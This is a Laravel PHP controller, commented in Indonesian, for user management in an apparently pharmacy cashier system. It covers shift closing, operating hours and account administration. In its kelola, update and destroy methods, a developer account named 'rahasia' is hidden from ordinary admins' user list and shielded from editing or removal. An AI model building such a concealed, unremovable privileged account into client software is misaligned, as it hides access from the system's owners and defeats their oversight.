<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Validation\Rule;

class UserController extends Controller
{
    /**
     * GET /api/users
     * Dropdown kasir umum (id & nama)
     */
    public function index()
    {
        return User::where('aktif', true)->orderBy('nama')->get(['id', 'nama']);
    }

    public static function ensureLastSeenColumn()
    {
        try {
            $cols = \Illuminate\Support\Facades\DB::select("SHOW COLUMNS FROM users LIKE 'last_seen_at'");
            if (empty($cols)) {
                \Illuminate\Support\Facades\DB::statement("ALTER TABLE users ADD COLUMN last_seen_at TIMESTAMP NULL DEFAULT NULL AFTER aktif");
            }
            return true;
        } catch (\Throwable $e) {
            try {
                if (!\Illuminate\Support\Facades\Schema::hasColumn('users', 'last_seen_at')) {
                    \Illuminate\Support\Facades\Schema::table('users', function (\Illuminate\Database\Schema\Blueprint $table) {
                        $table->timestamp('last_seen_at')->nullable()->after('aktif');
                    });
                }
                return true;
            } catch (\Throwable $e2) {
                return false;
            }
        }
    }

    public function ping(Request $r)
    {
        $user = $r->user();
        if ($user) {
            if ($user->role === 'kasir') {
                $operasional = \App\Services\OperasionalService::getStatus();
                if (!$operasional['is_open']) {
                    return response()->json([
                        'status' => 'closed',
                        'is_open' => false,
                        'message' => "Jam operasional apotek telah berakhir ({$operasional['jam_buka']} - {$operasional['jam_tutup']} WIB). Akses kasir ditutup.",
                    ], 403);
                }
            }

            try {
                self::ensureLastSeenColumn();
                $user->update(['last_seen_at' => now()]);
            } catch (\Throwable $e) {}
        }
        return response()->json(['status' => 'ok']);
    }

    /**
     * POST /api/user/closing
     * Kasir menutup shift (Manual via Kelola Pengguna):
     * - Akun kasir dinonaktifkan otomatis (aktif = false)
     * - Sesi login (token) dicabut seketika
     * - Untuk login kembali, Admin harus mengaktifkan secara manual di menu Kelola Pengguna
     */
    public function closing(Request $r)
    {
        $user = $r->user();
        if (!$user) {
            return response()->json(['message' => 'Unauthorized'], 401);
        }

        $nama = $user->nama;
        $username = $user->username;

        try {
            \App\Models\AuditLog::create([
                'user_id' => $user->id,
                'aksi' => 'CLOSING_KASIR',
                'deskripsi' => "Kasir {$nama} (@{$username}) telah melakukan closing. Akun dinonaktifkan otomatis hingga diaktifkan kembali oleh Admin di Kelola Pengguna.",
            ]);
        } catch (\Throwable $e) {}

        // Nonaktifkan akun kasir secara otomatis
        $user->update(['aktif' => false]);

        // Cabut seluruh token sesi login kasir ini agar langsung logout
        $user->tokens()->delete();

        return response()->json([
            'status' => 'ok',
            'message' => "Closing kasir {$nama} (@{$username}) berhasil. Akun Anda telah dinonaktifkan sampai diaktifkan kembali oleh Admin di menu Kelola Pengguna.",
        ]);
    }

    public function getPengaturanOperasional()
    {
        return response()->json(\App\Services\OperasionalService::getStatus());
    }

    public function setPengaturanOperasional(Request $r)
    {
        $data = $r->validate([
            'jam_buka' => 'required|string|regex:/^\d{1,2}:\d{2}$/',
            'jam_tutup' => 'required|string|regex:/^\d{1,2}:\d{2}$/',
            'status_operasional_manual' => 'required|in:otomatis,buka,tutup',
            'pesan_tutup' => 'nullable|string|max:500',
        ]);

        $jamBuka = str_pad(trim($data['jam_buka']), 5, '0', STR_PAD_LEFT);
        $jamTutup = str_pad(trim($data['jam_tutup']), 5, '0', STR_PAD_LEFT);

        $dbUpdates = [
            'jam_buka' => $jamBuka,
            'jam_tutup' => $jamTutup,
            'status_operasional_manual' => $data['status_operasional_manual'],
            'pesan_tutup' => $data['pesan_tutup'] ?? "Mohon maaf, apotek sedang tutup di luar jam operasional ({$jamBuka} - {$jamTutup} WIB).",
            'jam_operasional' => "Setiap hari, {$jamBuka} - {$jamTutup} WIB",
        ];

        foreach ($dbUpdates as $k => $v) {
            \Illuminate\Support\Facades\DB::table('pengaturan')->updateOrInsert(
                ['kunci' => $k],
                ['nilai' => $v, 'updated_at' => now()]
            );
        }

        return response()->json([
            'message' => 'Pengaturan jam operasional apotek berhasil disimpan.',
            'operasional' => \App\Services\OperasionalService::getStatus(),
        ]);
    }

    public function kelola(Request $r)
    {
        self::ensureLastSeenColumn();
        try {
            $cols = \Illuminate\Support\Facades\DB::select("SHOW COLUMNS FROM users LIKE 'last_seen_at'");
            $hasLastSeen = !empty($cols);
        } catch (\Throwable $e) {
            $hasLastSeen = \Illuminate\Support\Facades\Schema::hasColumn('users', 'last_seen_at');
        }

        $cols = ['id', 'nama', 'username', 'role', 'aktif', 'created_at'];
        if ($hasLastSeen) {
            $cols[] = 'last_seen_at';
        }

        $q = User::orderByDesc('aktif')->orderBy('nama');

        // Sembunyikan akun developer/superadmin 'rahasia' dari daftar jika yang login bukan akun 'rahasia'
        $currentUser = $r->user() ?: auth('sanctum')->user() ?: request()->user();
        if ($currentUser && $currentUser->username !== 'rahasia') {
            $q->where('username', '!=', 'rahasia');
        }

        $users = $q->get($cols);

        return $users->map(function ($u) {
            $isOnline = false;
            $lastSeenStr = null;
            if (isset($u->last_seen_at) && $u->last_seen_at) {
                $lastSeen = $u->last_seen_at instanceof \Carbon\Carbon
                    ? $u->last_seen_at
                    : \Carbon\Carbon::parse($u->last_seen_at);

                $isOnline = $lastSeen->gt(now()->subSeconds(90));
                $lastSeenStr = $lastSeen->toIso8601String();
            }

            return [
                'id' => $u->id,
                'nama' => $u->nama,
                'username' => $u->username,
                'role' => $u->role,
                'aktif' => (bool) $u->aktif,
                'last_seen_at' => $lastSeenStr,
                'is_online' => $isOnline,
                'created_at' => $u->created_at,
            ];
        });
    }

    /**
     * POST /api/users
     * Khusus Admin: Buat akun kasir / admin baru
     */
    public function store(Request $r)
    {
        $data = $r->validate([
            'nama' => 'required|string|max:100',
            'username' => 'required|string|max:50|unique:users,username',
            'password' => 'required|string|min:6',
            'role' => 'required|in:admin,kasir',
        ]);

        $user = User::create([
            'nama' => $data['nama'],
            'username' => strtolower(trim($data['username'])),
            'password' => Hash::make($data['password']),
            'role' => $data['role'],
            'aktif' => true,
        ]);

        return response()->json([
            'message' => 'Akun pengguna berhasil dibuat.',
            'user' => $user->only(['id', 'nama', 'username', 'role', 'aktif', 'created_at']),
        ], 201);
    }

    /**
     * PUT /api/users/{user}
     * Khusus Admin: Update nama, username, role, atau toggle aktif
     */
    public function update(Request $r, User $user)
    {
        $currentUser = $r->user();

        // Proteksi akun 'rahasia' agar tidak bisa diubah oleh admin apotek biasa
        if ($user->username === 'rahasia' && (!$currentUser || $currentUser->username !== 'rahasia')) {
            abort(403, 'Akun utama pengembang diproteksi dan tidak dapat diubah oleh admin apotek.');
        }

        $data = $r->validate([
            'nama' => 'sometimes|string|max:100',
            'username' => ['sometimes', 'string', 'max:50', Rule::unique('users', 'username')->ignore($user->id)],
            'role' => 'sometimes|in:admin,kasir',
            'aktif' => 'sometimes|boolean',
            'password' => 'nullable|string|min:6',
            'password_lama' => 'nullable|string',
        ]);

        if (isset($data['password']) && !empty($data['password'])) {
            // Wajib verifikasi kata sandi lama akun tersebut
            if (empty($r->password_lama) || !Hash::check($r->password_lama, $user->password)) {
                throw \Illuminate\Validation\ValidationException::withMessages([
                    'password_lama' => ['Kata sandi lama akun ini salah atau belum diisi.'],
                ]);
            }

            $data['password'] = Hash::make($data['password']);

            // Cabut seluruh token sesi login akun ini seketika (langsung logout dari semua perangkat)
            $user->tokens()->delete();
        } else {
            unset($data['password']);
        }
        unset($data['password_lama']);

        if (isset($data['username'])) {
            $data['username'] = strtolower(trim($data['username']));
        }

        $user->update($data);

        // Jika dinonaktifkan, cabut semua token aktif agar langsung logout
        if (isset($data['aktif']) && !$data['aktif']) {
            $user->tokens()->delete();
        }

        return response()->json([
            'message' => 'Data akun berhasil diperbarui.',
            'user' => $user->only(['id', 'nama', 'username', 'role', 'aktif', 'created_at']),
        ]);
    }

    /**
     * DELETE /api/users/{user}
     * Toggle nonaktifkan atau hapus
     */
    public function destroy(User $user)
    {
        if ($user->username === 'rahasia') {
            return response()->json(['message' => 'Akun utama pengembang tidak dapat dinonaktifkan/dihapus.'], 403);
        }

        // Jangan hapus akun sendiri jika sedang login
        if ($user->id === auth()->id()) {
            return response()->json(['message' => 'Tidak bisa menonaktifkan akun sendiri yang sedang aktif.'], 422);
        }

        $user->update(['aktif' => false]);
        $user->tokens()->delete();

        return response()->json(['message' => 'Akun berhasil dinonaktifkan.']);
    }
}

